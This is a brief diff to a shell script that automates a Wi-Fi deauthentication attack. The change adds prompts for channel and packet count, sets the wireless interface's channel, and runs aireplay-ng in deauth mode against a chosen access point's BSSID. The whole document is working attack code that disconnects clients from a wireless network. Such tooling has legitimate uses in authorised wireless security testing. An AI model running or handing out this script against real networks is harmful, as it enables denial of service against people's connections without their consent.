@@ -9,5 +9,8 @@ if [ ${mode} = "Mode:Managed" ]; then
 fi
 
 read -p "bssid?: " bssid
+read -p "channel?: " channel
+read -p "count?: " count
 
-sudo aireplay-ng -0 20 -a "$bssid" "$INTERFACE"
+sudo iwconfig $INTERFACE channel $channel
+sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
